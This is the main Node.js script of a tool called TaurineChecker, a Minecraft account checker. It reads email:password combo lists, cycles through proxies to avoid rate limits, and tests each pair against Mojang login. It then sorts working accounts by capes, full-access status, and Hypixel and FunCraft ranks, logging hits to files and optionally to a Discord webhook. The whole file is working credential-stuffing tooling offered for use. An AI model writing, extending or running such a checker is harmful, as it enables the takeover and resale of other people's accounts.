const fs = require("fs")
const {
    version
} = require("os")
const sequelize = require('sequelize')
const handler = require("./src/handler")
const chalk = require("chalk")
const wait = require('system-sleep')
const Discord = require('discord.js')
const clear = require('console-clear');
const figlet = require("figlet");
const logUpdate = require('log-update');
let config;

module.exports.def = {
    overviewmode: false,
    statsmode: false,
    version: 0.1,
    headers: {
        "Content-Type": "application/json",
        'Pragma': 'no-cache'
    },
    stats: {
        badMojang: 0,
        badOF: 0,
        badMinecon: 0,
        badFC: 0,
        badMFA: 0,
        hitMojang: 0,
        hitOF: 0,
        hitMinecon: 0,
        hitFC: 0,
        hitMFA: 0,
        hitSFA: 0,
        hitNFA: 0,
        hitHypixel: 0,
        hitLabyMod: 0
    }
}

clear();

let showFiglet = async () => {
    console.log(chalk.red(figlet.textSync(`TaurineChecker`)) + "v" + this.def.version + " by D0wzy (https://github.com/D0wzy)");
}

let showStats = async () => {
    setTimeout(async () => {
        logUpdate(`${chalk.underline('» Stats:')}
・MFA: ${chalk.green(this.def.stats.hitMFA)}
・NFA: ${chalk.green(this.def.stats.hitNFA)}
・SFA: ${chalk.green(this.def.stats.hitSFA)}
・Cape OptiFine: ${chalk.green(this.def.stats.hitMojang)}
・LabyMod Cape: ${chalk.green(this.def.stats.hitLabyMod)}
・Ranked FunCraft: ${chalk.green(this.def.stats.hitFC)}
・Ranked Hypixel: ${chalk.green(this.def.stats.hitHypixel)}
・Cape Minecon: ${chalk.green(this.def.stats.hitMinecon)}`);
    }, 100)
    //process.stdout.write(`${chalk.underline('» Stats:')}\n・MFA: ${this.def.stats.hitMFA}\n・FA: ${this.def.stats.hitMojang}\n・OptiFine: ${this.def.stats.hitMojang}\n・FunCraft: ${this.def.stats.hitFC}\n・Minecon: ${this.def.stats.hitMinecon}`);
}


showFiglet()

const timeout = async () => {
    setTimeout(async () => {
        process.title = `💉・TaurineChecker | Hit: ${this.def.stats.hitMojang} | Bad: ${this.def.stats.badMojang} | Optifine Caped: ${this.def.stats.hitOF} | Minecon Caped: ${this.def.stats.hitMinecon} | CPM: 0 | Checked: 0%`
        timeout()

        //process.stdout.clearLine();
        //clear()
    }, 100)
}


timeout()

if (!fs.existsSync('./results')) {
    fs.mkdirSync('./results');
}

if (!fs.existsSync('./results/bad.txt')) {
    fs.writeFile('./results/bad.txt', '', async () => {})
}

if (!fs.existsSync('./results/hit.txt')) {
    fs.writeFile('./results/hit.txt', '', async () => {})
}

if (!fs.existsSync("./config.json")) {
    handler.checkConfig().then(async (content) => {
        fs.writeFile('./config.json', content, async () => {
            config = JSON.parse(fs.readFileSync("./config.json"))

            if (config.UseWebHook && config.WebHook !== "") this.def.webhookClient = new Discord.WebhookClient(config.WebHook.split("/")[5], config.WebHook.split("/")[6])
        })
    })
} else {
    config = JSON.parse(fs.readFileSync("./config.json"))
    if (config.UseWebHook && config.WebHook !== "") this.def.webhookClient = new Discord.WebhookClient(config.WebHook.split("/")[5], config.WebHook.split("/")[6])
}

handler.checkUpdate().then(async (v) => {
    if (this.def.version < v) {
        throw Error(chalk.red(chalk.italic("Your version is outdated !")))
    }
})

let userProxies = []
let proxies = []

const initCheck = async () => {
    fs.readFile(`./combo.txt`, async (err, data) => {
        data = data.toString();
        const acc = data.split("\r\n")
        let i = 0;

        acc.forEach(async (a) => {
            let mail = a.split(":")[0]
            let pw = a.split(":")[1]

            const init = async () => {

                if (config.UseProxy) {
                    fs.readFile(`./proxies.txt`, async (err, data) => {
                        data = data.toString();
                        const lines = data.split("\r\n");

                        if (!lines[i]) i = 0
                        //console.log("cc")

                        handler.checkMojang({
                            mail: mail,
                            password: pw,
                            useProxy: true,
                            proxy: {
                                ip: lines[i].split(":")[0],
                                port: lines[i].split(":")[1],
                            }
                        }).then(async (res) => {
                            if (!res) {
                                handler.throwBadMojang({
                                    mail: mail,
                                    password: pw,
                                    proxy: {
                                        ip: lines[i].split(":")[0],
                                        port: lines[i].split(":")[1],
                                    }
                                })
                            } else {
                                handler.throwHitMojang({
                                    mail: mail,
                                    password: pw,
                                    username: res.username,
                                    proxy: {
                                        ip: lines[i].split(":")[0],
                                        port: lines[i].split(":")[1],
                                    }
                                })

                                if (config.Options.CheckOptifine) {
                                    handler.checkOptifine(res).then(async (s) => {
                                        if (!s) {
                                            handler.throwBadOF({
                                                res,
                                                proxy: {
                                                    ip: lines[i].split(":")[0],
                                                    port: lines[i].split(":")[1],
                                                }
                                            })
                                        } else {
                                            handler.throwHitOF({
                                                res,
                                                proxy: {
                                                    ip: lines[i].split(":")[0],
                                                    port: lines[i].split(":")[1],
                                                }
                                            })
                                        }
                                    })
                                }

                                if (config.Options.CheckMFA) {
                                    handler.checkMFA({
                                        mail: mail,
                                        password: pw,
                                        proxy: {
                                            ip: lines[i].split(":")[0],
                                            port: lines[i].split(":")[1],
                                        }
                                    }).then(async (res) => {
                                        if (res) {
                                            handler.throwHitMFA({
                                                mail: mail,
                                                password: pw,
                                                proxy: {
                                                    ip: lines[i].split(":")[0],
                                                    port: lines[i].split(":")[1],
                                                }
                                            })
                                        } else {
                                            handler.throwBadMFA({
                                                mail: mail,
                                                password: pw,
                                                proxy: {
                                                    ip: lines[i].split(":")[0],
                                                    port: lines[i].split(":")[1],
                                                }
                                            })
                                        }
                                    })
                                }

                                if (config.Options.CheckFunCraft) {
                                    handler.checkFuncraft(res).then(async (s) => {
                                        if (s.neverConnected) handler.throwBadFC({
                                            username: res.username,
                                            neverConnected: true
                                        })
                                        if (s.rank == "Joueur") {
                                            handler.throwBadFC({
                                                rank: s.rank,
                                                username: res.username,
                                                password: res.password
                                            })
                                        } else {
                                            handler.throwHitFC({
                                                rank: s.rank,
                                                username: res.username,
                                                password: res.password
                                            })
                                        }
                                    })
                                }
                            }
                            i++
                        })
                    })
                } else {
                    handler.checkMojang({
                        mail: mail,
                        password: pw,
                        useProxy: false
                    }).then(async (res) => {
                        i++;
                        if (!res) {
                            handler.throwBadMojang({
                                mail: mail,
                                password: pw
                            })
                        } else {
                            handler.throwHit({
                                mail: mail,
                                password: pw,
                                username: res.username
                            })

                            if (config.Options.CheckOptifine) {
                                handler.checkOptifine(res).then(async (s) => {
                                    if (!s) {
                                        handler.throwBadOF(res)
                                    } else {
                                        handler.throwHitOF(res)
                                    }
                                })
                            }

                            if (config.Options.CheckMFA) {
                                handler.checkMFA({
                                    mail: mail,
                                    password: pw
                                }).then(async (res) => {
                                    if (res) {
                                        handler.throwHitMFA({
                                            mail: mail,
                                            password: pw
                                        })
                                    } else {
                                        handler.throwBadMFA({
                                            mail: mail,
                                            password: pw
                                        })
                                    }
                                })
                            }

                            if (config.Options.CheckFunCraft) {
                                handler.checkFuncraft(res).then(async (s) => {
                                    if (s.neverConnected) handler.throwBadFC({
                                        username: res.username,
                                        neverConnected: true
                                    })
                                    if (s.rank == "Joueur") {
                                        handler.throwBadFC({
                                            rank: s.rank,
                                            username: res.username,
                                            password: res.password
                                        })
                                    } else {
                                        handler.throwHitFC({
                                            rank: s.rank,
                                            username: res.username,
                                            password: res.password
                                        })
                                    }
                                })
                            }
                        }
                    })
                }
            }
            init();

            wait(config.Cooldown)
            i++
        })
    })
}


process.stdin.setRawMode(true);
process.stdin.resume();

const readline = require('readline');
readline.emitKeypressEvents(process.stdin);
process.stdin.setRawMode(true);
process.stdin.on('keypress', (str, key) => {
    if (key.ctrl && key.name === 'c') {
        process.exit();
    } else if (key.name === '1' && !this.def.started) {
        initCheck()
        this.def.started = true
        this.def.overviewmode = true
        this.def.statsmode = false
        clear();
        showFiglet()
    } else if (key.name === '2' && !this.def.started) {
        initCheck()
        this.def.started = true
        this.def.statsmode = true
        this.def.overviewmode = false
        clear();
        showFiglet()
        showStats()
    }
});

process.stdout.write(`${chalk.underline('» Select your mode:')}\n\r[${chalk.red("1")}]・Overview Mode\n\r[${chalk.red("2")}]・Stats Mode`);